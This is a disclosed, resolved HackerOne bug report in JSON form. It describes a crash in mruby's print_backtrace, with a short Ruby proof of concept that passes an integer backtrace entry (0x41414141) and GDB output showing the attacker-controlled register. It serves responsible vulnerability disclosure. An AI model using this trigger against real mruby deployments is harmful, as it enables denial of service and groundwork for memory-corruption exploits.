{
  "id": 197916,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTc5MTY=",
  "url": "https://hackerone.com/reports/197916",
  "title": "Crash in print_backtrace",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-01-12T19:29:27.356Z",
  "submitted_at": "2017-01-12T19:29:27.356Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tunz",
    "url": "/tunz",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-02-07T07:42:25.944Z",
  "bug_reporter_agreed_on_going_public_at": "2017-02-07T07:42:25.910Z",
  "team_member_agreed_on_going_public_at": "2017-02-07T01:24:26.479Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "This crash does not affect `mruby-engine` because it does not print the back trace in guest. We can control the register by setting a backtrace array.\n\n# PoC\n```ruby\nexc = Exception.new()\nexc.set_backtrace([0x41414141])\nraise exc\n```\n\n# GDB\n```\n$ gdb -q --args ./bin/mruby test12.rb\nReading symbols from ./bin/mruby...done.\n(gdb) r\nStarting program: /home/tunz/working/mruby/mruby/bin/mruby test12.rb\ntrace:\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000422b88 in print_backtrace (mrb=0x2333010, backtrace=...) at /home/tunz/working/mruby/mruby/src/backtrace.c:222\n222         fprintf(stream, \"\\t[%d] %.*s\\n\", i, (int)RSTRING_LEN(entry), RSTRING_PTR(entry));\n(gdb) x/i $pc\n=> 0x422b88 <print_backtrace+130>:      mov    eax,DWORD PTR [rax]\n(gdb) i r rax\nrax            0x41414141       1094795585\n```",
  "bounty_amount": "100.0",
  "formatted_bounty": "$100",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-03-09T01:24:26.512Z",
  "allow_singular_disclosure_after": -218804903.03069812,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "mpz",
    "eveeez",
    "spetr0x"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
